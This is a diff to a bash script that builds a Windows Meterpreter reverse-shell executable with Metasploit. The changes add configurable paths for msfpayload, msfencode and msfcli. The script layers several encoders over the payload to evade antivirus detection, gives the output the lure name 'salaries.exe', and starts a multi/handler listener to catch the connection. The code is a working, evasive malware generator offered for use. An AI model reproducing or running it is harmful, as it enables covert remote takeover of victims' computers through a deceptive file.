@@ -22,6 +22,9 @@
 
 # User options
 OUTPUTNAME="salaries.exe" # The payload exe created name
+MSFPAYLOAD=`which msfpayload` # Path to the msfpayload script
+MSFENCODE=`which msfencode` # Path to the msfencode script
+MSFCLI=`which msfcli` # Path to the msfcli script
 
 
 # Script begins
@@ -82,13 +85,13 @@ else
 fi
 
 #Check for Metasploit
-which msfconsole >/dev/null 2>&1 && which msfcli >/dev/null
-if [ $? -eq 0 ]
+if [[ "$MSFPAYLOAD" != "" || "$MSFENCODE" != "" || "$MSFCLI" != "" ]]
 	then
 		echo ""
 else
 		echo ""
 		echo -e "\e[01;31m[!]\e[00m Unable to find the required Metasploit program, cant continue. Install and try again"
+		echo -e "\e[01;31m[!]\e[00m If msfpayload, msfencode and msfcli are not in your PATH, edit this script options"
 		echo ""
 		exit 1
 fi
@@ -181,7 +184,7 @@ echo -e "\e[01;32m[-]\e[00m Generating Metasploit payload, please wait..."
 echo ""
 spinlong
 #Payload creater
-msfpayload windows/meterpreter/reverse_tcp LHOST="$IP" LPORT="$PORT" EXITFUNC=thread R | msfencode -e x86/shikata_ga_nai -c $ITER -t raw 2>/dev/null | msfencode -e x86/jmp_call_additive -c $ITER -t raw 2>/dev/null | msfencode -e x86/call4_dword_xor -c $ITER -t raw 2>/dev/null |  msfencode -e x86/shikata_ga_nai -c $ITER -t c > msf.c 2>/dev/null
+$MSFPAYLOAD windows/meterpreter/reverse_tcp LHOST="$IP" LPORT="$PORT" EXITFUNC=thread R | $MSFENCODE -e x86/shikata_ga_nai -c $ITER -t raw 2>/dev/null | $MSFENCODE -e x86/jmp_call_additive -c $ITER -t raw 2>/dev/null | $MSFENCODE -e x86/call4_dword_xor -c $ITER -t raw 2>/dev/null |  $MSFENCODE -e x86/shikata_ga_nai -c $ITER -t c > msf.c 2>/dev/null
 echo ""
 echo ""
 # Menu
@@ -313,18 +316,18 @@ rm msf.c >/dev/null 2>&1
 
 echo ""
 sleep 2
-	if [ "$INTEXT" = "1" ] 
+	if [ "$INTEXT" = "1" ]
 		then
 			echo -e "\e[01;32m[-]\e[00m Loading the Metasploit listener, please wait..."
 			echo ""
-			msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST="$IP" LPORT="$PORT" E 2>/dev/null
+			$MSFCLI exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST="$IP" LPORT="$PORT" E 2>/dev/null
 		else
 			echo ""
 			echo -e "\e[01;32m[-]\e[00m Run the following code on your listener system:"
 			echo ""
 			echo -e "\e[01;32m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
 			echo ""
-			echo "msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST="$IP" LPORT="$PORT" E"
+			echo "$MSFCLI exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST="$IP" LPORT="$PORT" E"
 			echo ""
 			echo -e "\e[01;32m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
 			echo ""
